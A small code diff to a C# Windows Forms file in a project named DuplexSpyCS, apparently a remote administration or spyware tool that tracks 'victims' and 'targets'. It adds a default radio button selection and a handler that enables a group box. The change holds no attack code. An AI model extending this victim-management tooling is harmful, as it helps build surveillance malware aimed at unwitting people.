@@ -66,6 +66,7 @@ namespace DuplexSpyCS
             listView1.CheckBoxes = true;
             toolStripStatusLabel1.Text = $"Target[{m_lsVictim.Count}]";
             toolStripStatusLabel2.Text = string.Empty;
+            radioButton1.Checked = true;
 
             //setup
             foreach (Victim v in m_lsVictim)
@@ -147,6 +148,11 @@ namespace DuplexSpyCS
         private void button5_Click(object sender, EventArgs e)
         {
             m_bSignalStop = true;
+        }
+
+        private void radioButton1_CheckedChanged(object sender, EventArgs e)
+        {
+            groupBox1.Enabled = radioButton1.Checked;
         }
     }
 }
